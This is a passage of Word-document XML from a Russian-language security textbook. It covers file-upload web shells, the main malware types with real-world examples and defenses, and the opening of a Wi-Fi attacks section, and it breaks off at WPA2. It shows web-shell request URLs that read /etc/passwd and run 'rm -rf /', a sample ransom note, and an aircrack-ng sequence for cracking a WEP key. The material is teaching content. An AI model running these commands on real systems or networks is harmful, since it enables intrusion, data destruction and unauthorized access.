    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>http://site.com/uploads/avatar.php?cmd=ls</w:t>
        <w:br/>
        <w:t>http://site.com/uploads/avatar.php?cmd=cat /etc/passwd</w:t>
        <w:br/>
        <w:t>http://site.com/uploads/avatar.php?cmd=rm -rf /</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Equifax 2017</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>RCE в Apache Struts (Java-фреймворк)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры выполнили команды на сервере → украли 147 млн записей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверка типа файла (не только расширение, но и MIME-type + содержимое)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Переименовывать загруженные файлы (не сохранять как `avatar.php`, а как `abc123.jpg`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Запретить выполнение скриптов в папке загрузок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.5.5. Вредоносное ПО: Когда твой компьютер работает на хакера</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Вирус</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Программа, которая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>копирует себя</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в другие файлы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Прикрепляется к легитимному exe-файлу (`game.exe`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Когда пользователь запускает `game.exe` → вирус активируется → заражает другие файлы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ущерб:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Удаление файлов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Повреждение загрузочного сектора</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кража данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример — ILOVEYOU (2000)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вирус распространялся через email с темой «ILOVEYOU»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вложение: `LOVE-LETTER-FOR-YOU.txt.vbs` (на самом деле VBScript)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При открытии заражал компьютер и рассылал себя всем контактам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ущерб: **$10 миллиардов**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Червь (Worm)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Самораспространяющаяся программа (не нужен носитель, в отличие от вируса).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Отличие от вируса:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вирус заражает файлы, червь — сам перемещается по сети.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример — WannaCry (2017)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ransomware-червь (шифрует файлы + требует выкуп)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовал уязвимость **EternalBlue** (эксплойт NSA для Windows SMB)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заразил **300,000 компьютеров** в 150 странах за 1 день</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пострадали: NHS (британская медицина, отменили операции), Renault (остановка заводов), FedEx, Deutsche Bahn</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требовал выкуп: **$300 в биткоинах**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Остановлен случайно: исследователь нашёл «kill switch» (домен в коде вируса, регистрация которого останавливала распространение)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обновлять ОС (Microsoft выпустила патч за 2 месяца до WannaCry, но многие не обновились)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отключить SMBv1 (устаревший протокол)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Троян (Trojan)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Вредоносная программа, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>маскирующаяся под легитимную</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Приложение «Бесплатный антивирус» → на самом деле крадёт пароли</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Взломанная игра (`GTA5_crack.exe`) → устанавливает бэкдор</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Fake Flash Player Update → устанавливает adware</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы троянов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Backdoor** — создаёт удалённый доступ для хакера</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Keylogger** — записывает нажатия клавиш (крадёт пароли)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Banker** — крадёт данные онлайн-банкинга</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**RAT (Remote Access Trojan)** — полный контроль над компьютером (веб-камера, микрофон, файлы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Emotet (2014-2021)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Троян-банкер, ставший «платформой для других вирусов»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Распространялся через фишинговые email с макросами Word</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Устанавливал дополнительные вирусы (TrickBot, Ryuk ransomware)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ущерб: **$2.5 миллиарда**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ликвидирован в 2021 совместной операцией Europol</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Ransomware (Вымогатель)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Вирус, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>шифрующий файлы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и требующий выкуп за расшифровку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Вирус попадает на компьютер (email, взлом RDP, уязвимость)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрует все файлы **AES-256** (документы, фото, базы данных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Показывает сообщение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Ваши файлы зашифрованы!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Заплатите 1 BTC на адрес bc1q... в течение 72 часов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Иначе файлы будут удалены навсегда.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**CryptoLocker (2013)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Первый массовый ransomware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заразил 500,000 компьютеров</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выкуп: $300-$2000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Создатели заработали **$3 миллиона** за несколько месяцев</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Colonial Pipeline (2021)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ransomware **DarkSide** зашифровал серверы крупнейшего топливопровода США</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Остановка поставок бензина на восточное побережье → паника, очереди на заправках</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выкуп: **$4.4 миллиона** в биткоинах (потом ФБР вернули $2.3 млн)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**NotPetya (2017)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Маскировался под ransomware, но **цель — уничтожение** (невозможно расшифровать файлы, даже заплатив)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Атака на Украину (через обновление бухгалтерской программы M.E.Doc)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Распространился на международные компании: Maersk (судоходство, потеряли $300 млн), Merck (фармацевтика, $870 млн), FedEx ($400 млн)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Общий ущерб: **$10 миллиардов** (самая разрушительная кибератака в истории)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Backup** (правило 3-2-1: 3 копии, 2 носителя, 1 offsite)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не открывать подозрительные вложения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обновлять ОС и ПО</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отключить макросы в Office по умолчанию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сегментировать сеть (ransomware не должен распространиться на все компьютеры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Spyware (Шпионское ПО)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Программа, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>собирающая информацию</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> о пользователе без его ведома.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что собирает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>История браузера</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пароли (из сохранённых в браузере)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скриншоты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нажатия клавиш (keylogger)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Данные банковских карт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример — Pegasus (NSO Group)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Шпионское ПО для iOS/Android</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовалось спецслужбами для слежки за журналистами, активистами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Может: читать сообщения, слушать звонки, включать камеру/микрофон, отслеживать GPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заражение: через **zero-click exploit** (не нужно кликать на ссылку — достаточно получить iMessage)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Антивирус</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не устанавливать приложения из неизвестных источников</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регулярно проверять список установленных программ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Rootkit</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Вредоносное ПО, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>скрывающее своё присутствие</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в системе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заменяет системные утилиты (`ls`, `ps`, `netstat`) на модифицированные версии, которые скрывают файлы/процессы rootkit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь запускает `ps` → видит обычные процессы → rootkit не виден</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**User-mode rootkit** — работает на уровне приложений (легче обнаружить)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Kernel-mode rootkit** — внедряется в ядро ОС (очень сложно обнаружить)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Bootkit** — заражает загрузчик (запускается ДО операционной системы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример — Sony BMG Rootkit (2005)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sony встроила rootkit в музыкальные CD для защиты от копирования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rootkit устанавливался автоматически при вставке CD в Windows</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скрывал файлы, начинающиеся с `$sys$`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры использовали это для скрытия своих вирусов (называли файлы `$sys$trojan.exe`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скандал → Sony отозвала 5.7 млн дисков</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовать **UEFI Secure Boot** (проверка подписи загрузчика)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Антивирусы с проверкой на руткиты (Kaspersky, Malwarebytes)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Переустановка ОС (иногда единственный способ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.5.6. Атаки на Wi-Fi: Как твой сосед крадёт Netflix</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Взлом WEP (Wired Equivalent Privacy)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему WEP устарел:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использует **RC4** (слабое шифрование)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Можно взломать за **5 минут** с помощью **aircrack-ng**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает взлом:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># 1. Перевести Wi-Fi-адаптер в режим мониторинга</w:t>
        <w:br/>
        <w:t>airmon-ng start wlan0</w:t>
        <w:br/>
        <w:br/>
        <w:t># 2. Сканировать сети</w:t>
        <w:br/>
        <w:t>airodump-ng wlan0mon</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3. Перехватывать пакеты с целевой сети</w:t>
        <w:br/>
        <w:t>airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan0mon</w:t>
        <w:br/>
        <w:br/>
        <w:t># 4. Подождать 50,000 пакетов (или ускорить, атакуя роутер)</w:t>
        <w:br/>
        <w:t># 5. Взломать ключ</w:t>
        <w:br/>
        <w:t>aircrack-ng capture-01.cap</w:t>
        <w:br/>
        <w:t># Результат: WEP-ключ найден за 2-5 минут</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Никогда не используй WEP** (мёртвая технология)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Только **WPA2** или **WPA3**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Взлом WPA2 (Wi-Fi Protected Access 2)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
